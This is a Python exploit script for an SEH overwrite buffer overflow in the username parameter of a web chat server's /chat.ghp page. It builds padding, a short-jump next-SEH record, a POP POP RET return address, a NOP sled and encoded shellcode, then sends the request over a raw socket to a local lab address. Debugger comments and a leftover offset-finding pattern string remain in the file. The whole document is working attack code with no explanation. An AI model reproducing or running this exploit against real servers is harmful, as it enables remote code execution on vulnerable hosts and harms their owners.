import socket 


#   01256DD8   51627653  SvbQ  Pointer to next SEH record      217
#   100104BC   5F               POP EDI
#   100104BD   5E               POP ESI
#   100104BE   C3               RETN

pattern = '5I8C4s4vFcucBQ7hZILZvC54dXDhEGuwDOD08IYShovWS64L3vpflcka47eJixIp2lLo17NVvb46HshNt8GlqbZz79B1bGMKxstjU5s6JFvimu1pXMPttLy6yDCevZ5oaWGM0anpo5EYuQAnFROZpVbb4z7OpXg6XdOGUrkKZRozmq0K6rcOp17H25kdPZFE3ozFIEKonDRYGWkXdCFvLcuwvSvbQIPJSQNBgfJEo0dZ8uIK08PA7FSP0GwJwsVtlu2qG16JNjxITo8gHy7Fk5t5oMb7s24UER8OBZwgiJEs0sKn5Qo5mHPUqLeTiwQU4Qn61aE1BKV7WczzbsxrgyvAdT1DczYaCJsdmvluYEjfxZRcxRdupJbcXzjxCU2e8ZcxJB4NX1cVM2xNB5BLNgMz60bBxUO64Xh1MDh88tbguF4rbKsB77pnKGA1TGb8KRbCYXvDAoGkDdOivBQBMp1eBc2ukgtw8sl6rEUIeKyx5kj8jD0V8IhHR5X9OEAVa7tl2DxKxGqfRgs5gSamEAKdS3agK7uRpmVALwbz4v03SzumHMTfDXM3CvTGV2aKDxhXONtkNdMGBBsjv7LyUYUaLWyEVlFvjx6zAXGKSBj4F9OIQnCaLIP9DZXcEpzwL1WhXL3VX2DpT5kXxPUupb4pQNCHI9h4JYi8aRoDN2IKPR2UQqfOUEEUQLe8vTrVzeRBa2QDNIVeyNNarYwU7kG71tddCHDPFg2V0eucbfhVM2bjRoOtPEEi3f6wzJbx28vQTGtfUmWbMeLal1S0zoCgn8hJ2euxGvtUhCG7EnCZs3KdA4ZdrfGEJ2Mggvn48lvFkHEGf22xA2Ekq7VJrLVpFX8XGGdC5JE2tORfCoa4zyXDa8cL0eIvT2jt5S6GAqcFgkvt3MLsGdFm0OarrfQpjMf427wCPbqeeGqlk5mLR1qYoURi0Qpdfv2jjAIiaNbTCZnotwwmhahEa5sqFx3yvyT33XEehFoiDydk'
junk = 'A'*209
junk += '\x90'*4
junk += '\xcc'*4
nseh = '\xeb\xfa\x90\x90'

#   100104BC
seh = '\xBC\x04\x01\x10'
shellcode = '\x90'*30
shellcode +=("\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49"+\
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"+\
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"+\
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"+\
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"+\
"\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47"+\
"\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c"+\
"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a"+\
"\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50"+\
"\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43"+\
"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a"+\
"\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c"+\
"\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44"+\
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c"+\
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47"+\
"\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50"+\
"\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44"+\
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43"+\
"\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42"+\
"\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b"+\
"\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45"+\
"\x31\x42\x4c\x42\x43\x45\x50\x41\x41")

junk2 = 'D'*(1000-len(junk+nseh+seh+shellcode))

req = 'GET /chat.ghp?username='
req += junk + nseh + seh + shellcode + junk2
req += '&password=abc&room=1 HTTP/1.1\r\n\r\n'

payload = req
payload = payload.encode('raw_unicode_escape')

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.117.128',80))

s.send(payload)

s.close()
